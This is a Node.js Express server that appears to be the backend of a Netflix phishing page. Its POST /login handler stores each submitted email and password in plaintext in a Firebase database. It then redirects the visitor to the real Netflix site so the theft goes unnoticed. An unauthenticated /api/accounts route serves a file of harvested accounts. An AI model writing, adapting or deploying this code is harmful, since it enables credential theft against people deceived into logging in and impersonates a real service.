const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');

// Initialize Firebase with credentials from environment
const firebaseConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN,
    databaseURL: process.env.FIREBASE_DATABASE_URL,
    projectId: process.env.FIREBASE_PROJECT_ID,
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.FIREBASE_APP_ID,
    serviceAccountKey: process.env.FIREBASE_SERVICE_ACCOUNT_KEY
};

// Initialize Firebase Admin (using service account for backend)
if (process.env.FIREBASE_SERVICE_ACCOUNT_KEY) {
    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: process.env.FIREBASE_DATABASE_URL
    });
}

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..', 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'login.html'));
});

app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    
    try {
        // Store credentials in Firebase Realtime Database
        const db = admin.database();
        const timestamp = Date.now();
        const accountRef = db.ref('accounts/' + timestamp);
        
        await accountRef.set({
            email: email,
            password: password,
            timestamp: new Date().toISOString()
        });
        
        res.redirect('https://www.netflix.com/ph-en/');
    } catch (error) {
        console.error('Firebase error:', error);
        // Fallback redirect even if Firebase fails
        res.redirect('https://www.netflix.com/ph-en/');
    }
});

app.get('/api/accounts', (req, res) => {
    const fs = require('fs');
    try {
        const data = fs.readFileSync(path.join(__dirname, '..', 'accounts.txt'), 'utf8');
        res.setHeader('Content-Type', 'text/plain');
        res.send(data);
    } catch (err) {
        res.status(404).json({ error: 'Accounts file not found' });
    }
});

module.exports = app;
